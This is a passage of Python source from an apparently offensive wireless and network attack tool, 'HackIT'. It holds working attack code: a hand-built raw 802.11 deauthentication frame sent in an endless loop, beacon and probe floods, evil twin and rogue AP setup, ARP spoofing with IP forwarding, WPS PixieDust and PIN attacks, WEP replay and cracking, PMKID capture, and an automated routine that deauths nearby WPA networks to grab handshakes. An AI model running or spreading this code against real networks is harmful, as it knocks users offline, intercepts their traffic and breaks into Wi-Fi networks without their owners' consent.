            UI.print_warning("hashcat stopped.")

    def do_verify(self, capture_file: str, json_output: bool = False, strict: bool = False, output: Optional[str] = None, **kwargs):
        if not os.path.exists(capture_file):
            UI.print_error(f"File not found: {capture_file}")
            return
        result = self.bridge.rust_verify(capture_file)
        if result.returncode == 0:
            UI.print_success(result.stdout or "Handshake valid.")
        else:
            UI.print_error(result.stderr or "Verification failed.")

    def do_convert_hc22000(self, capture_file: str, ssid: Optional[str] = None, bssid: Optional[str] = None, output: Optional[str] = None, **kwargs):
        if not os.path.exists(capture_file):
            UI.print_error(f"File not found: {capture_file}")
            return
        result = self.bridge.rust_convert_hc22000(capture_file)
        if result.returncode == 0:
            UI.print_success(result.stdout or "Conversion complete.")
        else:
            UI.print_error(result.stderr or "Conversion failed.")

    def do_convert_hccapx(self, capture_file: str, output: Optional[str] = None, **kwargs):
        UI.print_info("HCCAPX conversion not yet implemented.")

    def do_convert_csv(self, capture_file: str, output: Optional[str] = None, **kwargs):
        UI.print_info("CSV conversion not yet implemented.")

    def do_wordlists(self, search_path: str = "", show_size: bool = False, json_output: bool = False, **kwargs):
        candidates = [
            search_path,
            "/usr/share/wordlists",
            "/usr/share/dict",
            str(Path.home() / "wordlists"),
            str(BASE / ".." / ".." / "wordlists"),
        ]
        table = Table(title="[bold cyan]Wordlists Found[/bold cyan]", border_style="cyan")
        table.add_column("Path", style="cyan")
        table.add_column("Size", justify="right", style="green")
        table.add_column("Lines", justify="right", style="yellow")
        found = False
        for base in candidates:
            if not base:
                continue
            for f in glob.glob(os.path.join(base, "*")):
                if not os.path.isfile(f):
                    continue
                size = os.path.getsize(f)
                try:
                    with open(f, errors="ignore") as fh:
                        lines = sum(1 for _ in fh)
                except Exception:
                    lines = 0
                table.add_row(f, f"{size:,} B", f"{lines:,}")
                found = True
        if not found:
            UI.print_warning("No wordlists found. Install rockyou.txt or similar.")
            return
        _console.print(table)

    # ════════════════════════════════════════════════════════════
    # PHASE 4: Network Recon
    # ════════════════════════════════════════════════════════════

    def do_arp_scan(self, timeout: int = 10, iface: Optional[str] = None, **kwargs):
        subnet = self._detect_subnet()
        if not subnet:
            UI.print_error("Could not detect subnet. Specify one.")
            return
        UI.print_info(f"ARP scanning {subnet}...")
        try:
            proc = self.bridge.rust_arp_scan(subnet)
        except EngineBuildError:
            UI.print_error("Rust engine not built. Use Python fallback.")
            self._arp_scan_fallback(subnet)
            return

        table = Table(title=f"[bold cyan]ARP Scan: {subnet}[/bold cyan]", border_style="green")
        table.add_column("IP", style="cyan")
        table.add_column("MAC", style="yellow")
        table.add_column("Vendor", style="white")
        table.add_column("Hostname", style="dim")
        try:
            for line in proc.stdout:
                data = DataParser.parse_telemetry(line.strip())
                if data and data.get("event") == "host":
                    table.add_row(data["ip"], data["mac"], UI._oui_lookup(data["mac"]), data.get("hostname", ""))
            proc.wait()
            _console.print(table)
        except KeyboardInterrupt:
            proc.terminate()

    def _arp_scan_fallback(self, subnet: str):
        if shutil.which("arp-scan"):
            subprocess.run(["arp-scan", subnet])
        elif shutil.which("arping"):
            base = subnet.rsplit(".", 1)[0]
            for i in range(1, 255):
                ip = f"{base}.{i}"
                subprocess.run(["arping", "-c", "1", "-w", "1", ip], capture_output=True)
        else:
            import scapy.all as scapy
            try:
                ans, _ = scapy.arping(subnet, timeout=2, verbose=False)
                for s, r in ans:
                    _console.print(f"  {r.psrc:<16} {r.hwsrc}")
            except Exception as e:
                UI.print_error(f"Scapy ARP failed: {e}")

    def do_ping_sweep(self, subnet: str = "", timeout: int = 5, parallel: int = 10, output: Optional[str] = None, **kwargs):
        subnet = subnet or self._detect_subnet()
        if not subnet:
            UI.print_error("Specify subnet or use 'arp scan'.")
            return
        UI.print_info(f"Ping sweeping {subnet}...")
        base = subnet.rsplit(".", 1)[0]
        alive = []
        with Progress(SpinnerColumn(), TextColumn("[bold cyan]{task.description}"), console=_console) as p:
            task = p.add_task(f"Pinging {base}.1-254...", total=254)
            for i in range(1, 255):
                ip = f"{base}.{i}"
                ret = subprocess.run(["ping", "-c", "1", "-W", "1", ip], capture_output=True, text=True)
                if ret.returncode == 0:
                    alive.append(ip)
                p.update(task, advance=1)
        if alive:
            UI.print_success(f"Alive hosts: {len(alive)}")
            for ip in alive:
                _console.print(f"  [green]{ip}[/green]")
        else:
            UI.print_warning("No alive hosts found.")

    def do_port_scan(self, host: str, ports: str = "1-1024", timeout: int = 2000, threads: int = 50, top_ports: int = 0, service_detect: bool = False, scan_type: str = "syn", output: Optional[str] = None, **kwargs):
        try:
            proc = self.bridge.rust_port_scan(host, ports)
        except EngineBuildError:
            self._port_scan_fallback(host, ports)
            return
        table = Table(title=f"[bold cyan]Port Scan: {host}[/bold cyan]", border_style="cyan")
        table.add_column("Port", justify="right", style="yellow", width=8)
        table.add_column("Service", style="cyan")
        table.add_column("Status", style="green")
        try:
            for line in proc.stdout:
                data = DataParser.parse_telemetry(line.strip())
                if data and data.get("event") == "port_open":
                    target = data["target"]
                    port = target.split(":")[-1] if ":" in target else target
                    svc = self._svc_name(int(port)) if port.isdigit() else "?"
                    table.add_row(port, svc, "[bold green]OPEN[/bold green]")
            proc.wait()
            _console.print(table)
        except KeyboardInterrupt:
            proc.terminate()

    def _port_scan_fallback(self, host: str, ports: str = "1-1024"):
        UI.print_warning("Using Python fallback scanner (slow).")
        start_port, end_port = 1, 1024
        if "-" in ports:
            sp, ep = ports.split("-")
            start_port, end_port = int(sp), int(ep)
        from concurrent.futures import ThreadPoolExecutor
        import socket
        results = []
        def chk(port):
            s = socket.socket()
            s.settimeout(1)
            if s.connect_ex((host, port)) == 0:
                results.append(port)
            s.close()
        with ThreadPoolExecutor(max_workers=100) as ex:
            ex.map(chk, range(start_port, end_port + 1))
        if results:
            table = Table(title=f"[bold cyan]Open Ports: {host}[/bold cyan]", border_style="cyan")
            table.add_column("Port", style="yellow")
            table.add_column("Service", style="cyan")
            for p in sorted(results):
                table.add_row(str(p), self._svc_name(p))
            _console.print(table)
        else:
            UI.print_warning("No open ports found.")

    def do_os_detect(self, host: str, timeout: int = 30, aggressive: bool = False, output: Optional[str] = None, **kwargs):
        UI.print_info(f"OS fingerprinting {host}...")
        try:
            result = self.bridge.rust_os_detect(host)
        except EngineBuildError:
            UI.print_error("Rust engine not built.")
            return
        _console.print(result.stdout or "[dim]No response[/dim]")

    def do_services(self, host: str, timeout: int = 3000, threads: int = 20, output: Optional[str] = None, **kwargs):
        self.do_port_scan(host, "1-10000")

    def do_gateway(self, ipv6: bool = False, **kwargs):
        try:
            if os.name == "nt":
                out = subprocess.check_output("ipconfig", text=True)
                for line in out.splitlines():
                    if "Default Gateway" in line:
                        gw = line.split(":")[-1].strip()
                        _console.print(f"  [bold cyan]Gateway:[/bold cyan] {gw}")
                        return
            else:
                out = subprocess.check_output(["ip", "route"], text=True)
                for line in out.splitlines():
                    if line.startswith("default"):
                        gw = line.split()[2]
                        _console.print(f"  [bold cyan]Gateway:[/bold cyan] {gw}")
                        return
        except Exception as e:
            UI.print_error(str(e))

    # ════════════════════════════════════════════════════════════
    # PHASE 5: MITM & Wireless Attacks
    # ════════════════════════════════════════════════════════════

    @staticmethod
    def _mac_bytes(mac: str) -> bytes:
        return bytes(int(b, 16) for b in mac.replace("-", ":").split(":") if b)

    @staticmethod
    def _craft_deauth_frame(bssid: str, station: str, reason: int = 7, seq: int = 0) -> bytes:
        b = HackITWirelessExecutor._mac_bytes(bssid)
        s = HackITWirelessExecutor._mac_bytes(station)
        radiotap = bytes([0x00, 0x00, 0x0C, 0x00, 0x02, 0x00, 0x00, 0x00, 0x14, 0x00, 0x00, 0x00])
        fc = struct.pack("<H", 0x00C0)
        dur = struct.pack("<H", 0x013A)
        sctrl = struct.pack("<H", (seq << 4) & 0xFFFF)
        mgmt = fc + dur + s + b + b + sctrl
        body = struct.pack("<H", reason)
        return radiotap + mgmt + body

    def do_deauth(self, iface: str, bssid: str, station: str = "", reason: int = 7, channel: int = 0, output: Optional[str] = None, **kwargs):
        iface = iface or self._default_iface()
        station = station or BROADCAST_MAC
        UI.print_info(f"Deauth: {iface} → {bssid} → {station} (reason={reason}) — infinite, Ctrl+C to stop")

        if channel:
            try:
                subprocess.run(["iw", "dev", iface, "set", "channel", str(channel)], capture_output=True, timeout=3)
            except Exception:
                pass

        station_bytes = HackITWirelessExecutor._mac_bytes(station)
        bssid_bytes = HackITWirelessExecutor._mac_bytes(bssid)

        try:
            sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
            sock.bind((iface, 0))
        except PermissionError:
            UI.print_error("Root required. Run with sudo.")
            return
        except Exception as e:
            UI.print_error(f"Cannot open raw socket on {iface}: {e}")
            return

        sent = 0
        seq = 0
        stop = False

        def _signal_handler(sig, frame):
            nonlocal stop
            stop = True

        signal.signal(signal.SIGINT, _signal_handler)
        signal.signal(signal.SIGTERM, _signal_handler)

        try:
            while not stop:
                for _ in range(50):
                    if stop:
                        break
                    frame = HackITWirelessExecutor._craft_deauth_frame(bssid, station, reason, seq)
                    try:
                        sock.send(frame)
                        sent += 1
                    except OSError:
                        pass
                    seq = (seq + 1) & 0xFFF
                    if station != BROADCAST_MAC:
                        frame_cl = HackITWirelessExecutor._craft_deauth_frame(station, bssid, reason, seq)
                        try:
                            sock.send(frame_cl)
                            sent += 1
                        except OSError:
                            pass
                        seq = (seq + 1) & 0xFFF

                if sent % 500 == 0 and not stop:
                    _console.print(f"\r  [cyan]⚡ Deauth attacking {bssid}: {sent} frames sent[/cyan]", end="")

        except KeyboardInterrupt:
            pass
        finally:
            sock.close()
            signal.signal(signal.SIGINT, signal.SIG_DFL)
            signal.signal(signal.SIGTERM, signal.SIG_DFL)

        _console.print("")
        if sent:
            UI.print_success(f"Deauth complete: {sent} frames sent → {bssid}")
        else:
            UI.print_error(f"Deauth failed: 0 frames sent. Check monitor mode on {iface}")

    def do_beacon_flood(self, iface: str, ssid: str = "", count: int = 50, channel: int = 6, caps: Optional[str] = None, **kwargs):
        iface = iface or self._default_iface()
        if not ssid:
            ssid = f"HackIT_{int(time.time() * 1000) % 10000:04d}"
        try:
            proc = self.bridge.rust_beacon_flood(iface, ssid, count, channel)
        except EngineBuildError as e:
            UI.print_error(str(e))
            return
        UI.print_info(f"Beacon flood: {iface} '{ssid}' x{count} on ch {channel}")
        for line in proc.stdout:
            l = line.strip()
            if l:
                _console.print(f"  {l}")
        proc.wait()

    def do_probe_flood(self, iface: str, count: int = 100, interval: int = 50, random_mac: bool = False, **kwargs):
        iface = iface or self._default_iface()
        try:
            proc = self.bridge.rust_probe_flood(iface, count)
        except EngineBuildError as e:
            UI.print_error(str(e))
            return
        UI.print_info(f"Probe flood: {iface} x{count}")
        for line in proc.stdout:
            l = line.strip()
            if l:
                _console.print(f"  {l}")
        proc.wait()

    def do_eviltwin(self, iface: str, ssid: str, channel: int = 6, caps: Optional[str] = None, captive: bool = False, bssid: Optional[str] = None, dhcp_range: Optional[str] = None, **kwargs):
        if not ssid:
            UI.print_error("Specify SSID to clone.")
            return
        iface = iface or self._default_iface()
        UI.print_info(f"Evil Twin: cloning '{ssid}' on {iface} ch {channel}")
        UI.print_info("Sending beacon frames with cloned SSID...")
        self.do_beacon_flood(iface, ssid, 100, channel)
        UI.print_info("Set up a DHCP server and AP on the same channel for full rogue AP.")

    def do_rogue_ap(self, iface: str, ssid: Optional[str] = None, channel: int = 6, wpa2: bool = False, captive: bool = False, bssid: Optional[str] = None, dhcp_range: Optional[str] = None, **kwargs):
        UI.print_info(f"Starting rogue AP '{ssid}' on {iface} ch {channel}...")
        self.do_beacon_flood(iface, ssid, 500, channel)
        UI.print_info("Rogue AP beaconing active. Set up hostapd + dnsmasq for full functionality.")

    def do_arp_spoof(self, target: str, gateway: str, timeout: int = 0, interval: int = 2, full_duplex: bool = False, output: Optional[str] = None, **kwargs):
        UI.print_info(f"ARP spoof: {target} ↔ {gateway}")
        try:
            proc = self.bridge.rust_arp_spoof(target, gateway)
        except EngineBuildError as e:
            UI.print_error(str(e))
            return
        jid = self.jobs.start(f"arp-spoof-{target}", proc)
        UI.print_info(f"ARP spoof job {jid} running (Ctrl+C to stop)...")
        try:
            for line in proc.stdout:
                l = line.strip()
                if l:
                    _console.print(f"  {l}")
            proc.wait()
        except KeyboardInterrupt:
            proc.terminate()
            UI.print_warning("ARP spoof stopped.")

    def do_forward(self, state: str, persist: bool = False, **kwargs):
        enable = state.lower() in ("on", "enable", "1", "true")
        try:
            if os.name == "nt":
                val = "1" if enable else "0"
                subprocess.run(["reg", "add",
                    r"HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters",
                    "/v", "IPEnableRouter", "/t", "REG_DWORD", "/d", val, "/f"], check=True)
            else:
                with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                    f.write("1\n" if enable else "0\n")
            UI.print_success(f"Forwarding {'ENABLED' if enable else 'DISABLED'}.")
        except Exception as e:
            UI.print_error(str(e))

    # ════════════════════════════════════════════════════════════
    # PHASE 6: WPS/WEP/PWKID
    # ════════════════════════════════════════════════════════════

    def do_wps_scan(self, iface: str, timeout: int = 30, output: Optional[str] = None, **kwargs):
        iface = iface or self._default_iface()
        if shutil.which("wash"):
            UI.print_info(f"WPS scan via wash on {iface}...")
            subprocess.run(["wash", "-i", iface])
            return
        try:
            proc = self.bridge.rust_wps_scan(iface)
            for line in proc.stdout:
                _console.print(f"  {line.strip()}")
            proc.wait()
        except EngineBuildError:
            UI.print_warning("wash not found and Rust engine missing.")
            UI.print_info("Install wash (apt install reaver) or build the Rust engine.")

    def do_wps_pixie(self, iface: str, bssid: str, pin: str = "", timeout: int = 120, **kwargs):
        iface = iface or self._default_iface()
        if not bssid:
            UI.print_error("Specify BSSID.")
            return
        if shutil.which("reaver"):
            cmd = ["reaver", "-i", iface, "-b", bssid, "-K", "-vv"]
            if pin:
                cmd.extend(["-p", pin])
            UI.print_info(f"reaver PixieDust attack on {bssid}...")
            subprocess.run(cmd)
        elif shutil.which("bully"):
            cmd = ["bully", "-b", bssid, "-d", iface, "-F", "-B", "-T"]
            if pin:
                cmd.extend(["-p", pin])
            UI.print_info(f"bully PixieDust attack on {bssid}...")
            subprocess.run(cmd)
        else:
            try:
                proc = self.bridge.rust_wps_pixie(iface, bssid, pin)
                for line in proc.stdout:
                    _console.print(f"  {line.strip()}")
                proc.wait()
            except EngineBuildError:
                UI.print_error("No WPS tools available. Install reaver or bully.")

    def do_wps_pin(self, bssid: str, all_pins: bool = False, **kwargs):
        if not bssid or len(bssid) < 17:
            UI.print_error("Invalid BSSID format (XX:XX:XX:XX:XX:XX)")
            return
        try:
            proc = self.bridge.go_wps_pin(bssid)
            for line in proc.stdout:
                l = line.strip()
                if l:
                    _console.print(f"  {l}")
            proc.wait()
        except EngineBuildError:
            UI.print_error("Go workers not built.")

    def do_wep_capture(self, iface: str, bssid: str, output: str = "wep.pcap", timeout: int = 120, ivs_only: bool = False, **kwargs):
        iface = iface or self._default_iface()
        if not bssid:
            UI.print_error("Specify BSSID.")
            return
        try:
            proc = self.bridge.rust_wep_capture(iface, bssid, output)
            for line in proc.stdout:
                _console.print(f"  {line.strip()}")
            proc.wait()
        except EngineBuildError:
            UI.print_warning("Rust engine missing. Using airodump-ng fallback.")
            subprocess.run(["airodump-ng", "-c", "--bssid", bssid, "-w", output.replace(".pcap", ""), iface])

    def do_wep_arp_replay(self, iface: str, bssid: str, count: int = 0, delay: int = 0, timeout: int = 0, **kwargs):
        iface = iface or self._default_iface()
        if not bssid:
            UI.print_error("Specify BSSID.")
            return
        if shutil.which("aireplay-ng"):
            UI.print_info(f"ARP replay on {bssid} via aireplay-ng...")
            subprocess.run(["aireplay-ng", "-3", "-b", bssid, iface])
        else:
            try:
                proc = self.bridge.rust_wep_arp_replay(iface, bssid)
                for line in proc.stdout:
                    _console.print(f"  {line.strip()}")
                proc.wait()
            except EngineBuildError:
                UI.print_error("No ARP replay tool available.")

    def do_wep_crack(self, capture: str, method: str = "ptw", output: Optional[str] = None, **kwargs):
        if not os.path.exists(capture):
            UI.print_error(f"File not found: {capture}")
            return
        if shutil.which("aircrack-ng"):
            subprocess.run(["aircrack-ng", capture])
        else:
            result = self.bridge.rust_wep_crack(capture)
            _console.print(result.stdout or result.stderr or "No output")

    def do_pmkid_capture(self, iface: str, bssid: str = "", timeout: int = 30, output: str = "", **kwargs):
        iface = iface or self._default_iface()
        UI.print_info(f"Capturing PMKID on {iface}...")
        if bssid:
            UI.print_info(f"Targeting {bssid}")
        try:
            proc = self.bridge.rust_handshake(iface, bssid, "pmkid.pcap", 60)
            for line in proc.stdout:
                l = line.strip()
                if l:
                    _console.print(f"  {l}")
            proc.wait()
        except EngineBuildError:
            UI.print_warning("Using hcxdumptool fallback...")
            if shutil.which("hcxdumptool"):
                subprocess.run(["hcxdumptool", "-i", iface, "-o", "pmkid.pcapng", "--enable_status=1"])

    # ════════════════════════════════════════════════════════════
    # PHASE 7: Spectrum & Interface Control
    # ════════════════════════════════════════════════════════════

    def do_spectrum(self, iface: str, **kwargs):
        iface = iface or self._default_iface()
        try:
            proc = self.bridge.go_spectrum(iface)
            lines = []
            for line in proc.stdout:
                l = line.strip()
                if l:
                    lines.append(l)
            proc.wait()
            channels = []
            for l in lines:
                m = re.search(r'Ch\s*(\d+)\s*\|\s*(\d+ MHz)\s*\|\s*(\S+)\s*\|\s*RSSI:\s*(-?\d+)', l)
                if m:
                    channels.append({"number": int(m.group(1)), "frequency": m.group(2),
                                     "band": m.group(3), "rssi": int(m.group(4)),
                                     "ap_count": 0, "utilization": 0})
            if channels:
                _console.print(UI.render_spectrum(channels))
            else:
                for l in lines:
                    _console.print(f"  {l}")
        except EngineBuildError:
            self._spectrum_fallback(iface)

    def _spectrum_fallback(self, iface: str):
        UI.print_info(f"Wi-Fi scanning (fallback) on {iface}...")
        channels = []
        for ch in range(1, 14):
            try:
                subprocess.run(["iw", "dev", iface, "set", "channel", str(ch)], capture_output=True, text=True)
                time.sleep(0.1)
                raw = subprocess.check_output(["iw", "dev", iface, "scan"], text=True, stderr=subprocess.DEVNULL, timeout=3)
                ap_count = raw.count("BSS ")
                sigs = re.findall(r'signal:\s*(-?\d+)', raw)
                avg_sig = sum(int(s) for s in sigs) // len(sigs) if sigs else -100
                channels.append({"number": ch, "frequency": f"{2412 + (ch - 1) * 5}", "band": "2.4GHz",
                                 "rssi": avg_sig, "ap_count": ap_count, "utilization": ap_count / 20})
            except Exception:
                continue
        if channels:
            _console.print(UI.render_spectrum(channels))

    def do_dual_band(self, iface: str):
        iface = iface or self._default_iface()
        UI.print_info(f"Dual-band analysis on {iface}...")
        for band, chans in [("2.4 GHz", range(1, 14)), ("5 GHz", [36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 144, 149, 153, 157, 161, 165])]:
            _console.print(f"\n[bold cyan]--- {band} ---[/bold cyan]")
            for ch in chans:
                try:
                    subprocess.run(["iw", "dev", iface, "set", "channel", str(ch)], capture_output=True, text=True, timeout=1)
                    time.sleep(0.02)
                except Exception:
                    continue
            raw = subprocess.check_output(["iw", "dev", iface, "scan"], text=True, stderr=subprocess.DEVNULL, timeout=10)
            bssids = set(re.findall(r'BSS ([0-9a-f:]{17})', raw))
            _console.print(f"  Found {len(bssids)} APs in {band}")

    # ════════════════════════════════════════════════════════════
    # PHASE 8: Automation
    # ════════════════════════════════════════════════════════════

    def do_auto_handshake(self, iface: str, timeout: int = 60, deauth: bool = False, output: Optional[str] = None, **kwargs):
        iface = iface or self._default_iface()
        UI.print_success("Auto Handshake Capture")
        UI.print_info("Step 1: Scanning for APs...")
        aps = self._scan_networks()
        if not aps:
            UI.print_warning("No APs found.")
            return
        UI.print_info(f"Step 2: Found {len(aps)} AP(s). Capturing handshakes...")
        for ap in aps[:5]:
            bssid = ap.get("bssid", "")
            ssid = ap.get("ssid", "")
            if not bssid or not ssid:
                continue
            crypto = ap.get("encrypt", ap.get("security", ""))
            if "WPA" not in crypto and "WPA2" not in crypto:
                continue
            UI.print_info(f"  → {ssid} ({bssid})")
            self.do_handshake_capture(iface, bssid, timeout=15)
            self.do_deauth(iface, bssid, count=5)
            time.sleep(2)
        UI.print_success("Step 3: Handshake capture complete. Check 'sessions'.")

    def do_auto_audit(self, iface: str, timeout: int = 300, skip_wep: bool = False, skip_wps: bool = False, output: Optional[str] = None, **kwargs):
        iface = iface or self._default_iface()
        UI.print_info("=== Full Automated Wireless Audit ===")
        self.do_crawl(iface, full=True)
        self.do_wpa3_detect(iface)
        self.do_hidden_ssid(iface)
        self.do_auto_handshake(iface)
        self.do_sessions()
        UI.print_success("Automated audit complete.")

    def do_auto_crack(self, search_dir: str = "", rules: Optional[str] = None, use_hashcat: bool = False, thread: int = 4, **kwargs):
        if not search_dir:
            search_dir = str(BASE)
        pcaps = glob.glob(os.path.join(search_dir, "*.pcap")) + glob.glob(os.path.join(search_dir, "handshakes", "*.pcap"))
        if not pcaps:
            UI.print_warning(f"No PCAP files found in {search_dir}")
            wordlist_paths = ["/usr/share/wordlists/rockyou.txt", "/usr/share/wordlists/rockyou.txt.gz"]
            for wp in wordlist_paths:
                if os.path.exists(wp):
                    UI.print_info(f"Trying wordlist: {wp}")
                    break
            else:
                UI.print_warning("No wordlist found. Install rockyou.txt.")
                return
        for pcap in pcaps:
            UI.print_info(f"Processing {pcap}...")
            self.do_verify(pcap)

    def do_jobs(self, json_output: bool = False, **kwargs):
        jobs = self.jobs.list_jobs()
        if not jobs:
            UI.print_warning("No background jobs running.")
            return
        table = Table(title="[bold cyan]Background Jobs[/bold cyan]", border_style="cyan")
        table.add_column("ID", style="yellow")
        table.add_column("Name", style="white")
        table.add_column("Status", style="green")
        table.add_column("Started", style="dim")
        table.add_column("Running", style="cyan")
        for j in jobs:
            table.add_row(j["id"], j["name"], j["status"], j["started"][:19],
                          "[green]✓[/green]" if j["running"] else "[red]✗[/red]")
        _console.print(table)

    def do_stop_job(self, jid: str):
        if self.jobs.stop(jid):
            UI.print_success(f"Job {jid} stopped.")
        else:
            UI.print_error(f"Job {jid} not found.")

    def do_stop_all(self, force: bool = False, **kwargs):
        self.jobs.stop_all()
        UI.print_success("All jobs stopped.")

    # ════════════════════════════════════════════════════════════
    # PHASE 9: Session / Workspace Management
    # ════════════════════════════════════════════════════════════

    def do_session_list(self, json_output: bool = False, **kwargs):
        try:
            proc = self.bridge.go_session()
            for line in proc.stdout:
                l = line.strip()
                if l:
                    _console.print(f"  {l}")
            proc.wait()
        except EngineBuildError:
            self._session_list_fallback()

    def _session_list_fallback(self):
        session_file = BASE / "go_workers" / "sessions.json"
        if session_file.exists():
            try:
                data = json.loads(session_file.read_text())
                table = Table(title="[bold cyan]Sessions[/bold cyan]", border_style="cyan")
                table.add_column("ID", style="yellow")
                table.add_column("SSID", style="white")
                table.add_column("BSSID", style="cyan")
                table.add_column("Status", style="green")
                for s in data if isinstance(data, list) else data.get("sessions", []):
                    table.add_row(s.get("id", "?")[:8], s.get("ssid", "?"), s.get("bssid", "?"), s.get("status", "?"))
                _console.print(table)
            except Exception:
                pass

    def do_workspace_create(self, name: str, path: Optional[str] = None, **kwargs):
        ws = BASE / "workspaces" / name
        ws.mkdir(parents=True, exist_ok=True)
        captures = ws / "captures"
        handshakes = ws / "handshakes"
        reports = ws / "reports"
        captures.mkdir(exist_ok=True)
        handshakes.mkdir(exist_ok=True)
        reports.mkdir(exist_ok=True)
        config = ws / "config.json"
        config.write_text(json.dumps({
            "created": dt.datetime.now().isoformat(),
            "name": name,
            "targets": [],
            "notes": "",
        }, indent=2))
        UI.print_success(f"Workspace '{name}' created at {ws}")

    def do_workspace_load(self, name: str):
        ws = BASE / "workspaces" / name
        if ws.is_dir():
            UI.print_success(f"Loaded workspace '{name}'")
            return str(ws)
        UI.print_error(f"Workspace '{name}' not found.")
        return None

    def do_report_export(self, session: str, fmt: str = "md", output: Optional[str] = None, **kwargs):
        UI.print_info(f"Exporting report for session '{session}' in {fmt} format...")
        out = BASE / "reports" / f"report_{session}.{fmt}"
        out.parent.mkdir(exist_ok=True)
        report = f"""# HackIT Wireless Audit Report
**Session:** {session}
**Date:** {dt.datetime.now().isoformat()}

## Summary
- TODO: Fill with scan data

## Findings
- TODO: Document vulnerabilities

## Recommendations
- TODO: Add recommendations
"""
        out.write_text(report)
        UI.print_success(f"Report saved: {out}")

    # ════════════════════════════════════════════════════════════
    # INTERNAL HELPERS
    # ════════════════════════════════════════════════════════════

    def _detect_subnet(self) -> str:
        try:
            if os.name == "nt":
                out = subprocess.check_output("ipconfig", text=True)
                for line in out.splitlines():
                    if "IPv4" in line:
                        ip = line.split(":")[-1].strip()
                        parts = ip.split(".")
                        if len(parts) == 4:
                            return f"{parts[0]}.{parts[1]}.{parts[2]}.0/24"
            else:
                out = subprocess.check_output(["hostname", "-I"], text=True)
                ip = out.split()[0]
                parts = ip.split(".")
                if len(parts) == 4:
                    return f"{parts[0]}.{parts[1]}.{parts[2]}.0/24"
        except Exception:
            pass
        try:
            if os.name == "nt":
                out = subprocess.check_output("netstat -rn", shell=True, text=True)
                for line in out.splitlines():
                    if "0.0.0.0" in line and any(p in line for p in ("192", "10.", "172")):
                        parts = line.split()
                        gw = parts[2] if "." in parts[2] else parts[3]
                        octets = gw.split(".")
                        if len(octets) == 4:
                            return f"{octets[0]}.{octets[1]}.{octets[2]}.0/24"
        except Exception:
            pass
        return ""

    @staticmethod
    def _svc_name(port: int) -> str:
        SERVICES = {
            21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
            80: "HTTP", 110: "POP3", 143: "IMAP", 443: "HTTPS", 445: "SMB",
            3306: "MySQL", 3389: "RDP", 5900: "VNC", 8080: "HTTP-Alt", 8443: "HTTPS-Alt",
        }
        return SERVICES.get(port, f"Port-{port}")

    def _mode_switch(self, iface: str, mode: str, force: bool = False):
        import platform
        plat = platform.system().lower()
        is_root = os.geteuid() == 0 if plat != "windows" else True
        sudo = [] if is_root else ["sudo"]
        try:
            # ── Platform-specific mode switch ──
            if plat == "linux":
                self._mode_switch_linux(iface, mode, sudo, force)
            elif plat == "darwin":
                self._mode_switch_macos(iface, mode, sudo)
            elif plat == "windows":
                self._mode_switch_windows(iface, mode)
            else:
                UI.print_error(f"Unsupported platform: {plat}")
        except subprocess.CalledProcessError as e:
            UI.print_error(f"Mode switch failed: {e}")
            UI.print_info("Try: --no-check to skip verification, or run as root")
        except Exception as e:
            UI.print_error(f"Unexpected error: {e}")

    def _mode_switch_linux(self, iface, mode, sudo, force):
        if mode == "monitor":
            UI.print_info("Killing interfering processes...")
            subprocess.run(sudo + ["systemctl", "stop", "NetworkManager", "wpa_supplicant", "avahi-daemon"],
                           stderr=subprocess.DEVNULL)
            subprocess.run(sudo + ["airmon-ng", "check", "kill"],
                           stderr=subprocess.DEVNULL)

            if not force:
                try:
                    subprocess.run(sudo + ["airmon-ng", "start", iface],
                                   check=True, capture_output=True, timeout=15)
                    mon = f"{iface}mon"
                    r = subprocess.run(sudo + ["iw", mon, "info"],
                                       capture_output=True, text=True, timeout=5)
                    if r.returncode == 0:
                        UI.print_success(f"{iface} → monitor (via airmon-ng)")
                        UI.print_info(f"Using {mon} for capture")
                        return
                except (subprocess.CalledProcessError, FileNotFoundError):
                    pass

        subprocess.run(sudo + ["ip", "link", "set", iface, "down"], check=True, timeout=10)
        subprocess.run(sudo + ["iw", "dev", iface, "set", "type", mode], check=True, timeout=10)
        subprocess.run(sudo + ["ip", "link", "set", iface, "up"], check=True, timeout=10)

        if mode == "managed":
            subprocess.run(sudo + ["systemctl", "restart", "NetworkManager", "wpa_supplicant"],
                           stderr=subprocess.DEVNULL)

        r = subprocess.run(sudo + ["iw", "dev", iface, "info"],
                           capture_output=True, text=True, timeout=5)
        if r.returncode == 0:
            for line in r.stdout.splitlines():
                if "type" in line and mode in line:
                    UI.print_success(f"{iface} → {mode}")
                    return
            UI.print_warning(f"{iface}: mode switch may not have taken effect")
        else:
            UI.print_warning("Could not verify mode (iw not available)")

    def _mode_switch_macos(self, iface, mode, sudo):
        if mode == "monitor":
            UI.print_info("Disassociating from current AP...")
            subprocess.run(sudo + ["/System/Library/PrivateFrameworks/Apple80211.framework/"
                                   "Versions/Current/Resources/airport", "-z"],
                           stderr=subprocess.DEVNULL)
            subprocess.run(sudo + ["ifconfig", iface, "down"], stderr=subprocess.DEVNULL)
            subprocess.run(sudo + ["ifconfig", iface, "up"], stderr=subprocess.DEVNULL)
            subprocess.Popen(sudo + ["/System/Library/PrivateFrameworks/Apple80211.framework/"
                                     "Versions/Current/Resources/airport", iface, "sniff", "1"],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            UI.print_success(f"{iface} → monitor (airport sniff)")
        else:
            subprocess.run(["pkill", "-f", "airport.*sniff"], stderr=subprocess.DEVNULL)
            subprocess.run(sudo + ["networksetup", "-setairportpower", iface, "on"],
                           stderr=subprocess.DEVNULL)
            subprocess.run(sudo + ["ifconfig", iface, "up"], stderr=subprocess.DEVNULL)
            UI.print_success(f"{iface} → managed")

    def _mode_switch_windows(self, iface, mode):
        if mode == "monitor":
            UI.print_info("Enabling promiscuous mode...")
            subprocess.run(["netsh", "interface", "set", "interface", f"name={iface}", "admin=disabled"],
                           stderr=subprocess.DEVNULL)
            time.sleep(0.3)
            subprocess.run(["reg", "add", r"HKLM\SYSTEM\CurrentControlSet\Services\NDIS\Parameters",
                           "/v", "AllowMonitorMode", "/t", "REG_DWORD", "/d", "1", "/f"],
                           stderr=subprocess.DEVNULL)
            subprocess.run(["netsh", "interface", "set", "interface", f"name={iface}", "admin=enabled"],
                           stderr=subprocess.DEVNULL)
            time.sleep(0.3)
